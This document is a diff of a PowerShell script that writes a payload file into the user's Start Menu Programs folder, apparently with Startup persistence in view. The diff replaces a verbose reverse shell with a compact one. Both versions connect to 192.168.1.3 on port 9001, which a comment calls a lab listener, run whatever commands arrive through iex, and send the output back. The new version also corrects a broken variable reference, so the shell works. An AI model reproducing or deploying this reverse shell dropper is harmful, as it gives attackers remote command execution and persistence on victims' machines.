@@ -3,28 +3,13 @@ $programsPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs"
 $startupPath  = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
 $ps1Path = Join-Path $programsPath "code2.ps1"
 $ps1Content = @'
-$serverIP = '192.168.1.3'  # Lab listener IP
-$serverPort = 9001           # Lab listener port
-
-try {
-    $client = New-Object System.Net.Sockets.TCPClient($server, $port)
-    $stream = $client.GetStream()
-    $writer = New-Object System.IO.StreamWriter($stream)
-    $writer.AutoFlush = $true
-
-    while ($client.Connected) {
-        $data = New-Object byte[] 1024
-        $bytes = $stream.Read($data, 0, $data.Length)
-        if ($bytes -gt 0) {
-            $command = (New-Object System.Text.ASCIIEncoding).GetString($data, 0, $bytes)
-            $output = Invoke-Expression $command 2>&1 | Out-String
-            $writer.WriteLine($output)
-        }
-    }
-} catch {
-    
+$sm = (New-Object Net.Sockets.TCPClient('192.168.1.3',9001)).GetStream()
+[byte[]]$bt = 0..65535 | % {0}
+while (($i = $sm.Read($bt, 0, $bt.Length)) -ne 0) {
+    $d = (New-Object Text.ASCIIEncoding).GetString($bt, 0, $i)
+    $st = ([Text.Encoding]::ASCII).GetBytes((iex $d 2>&1 | Out-String))
+    $sm.Write($st, 0, $st.Length)
 }
-
 '@
 
 Set-Content -Path $ps1Path -Value $ps1Content -Force
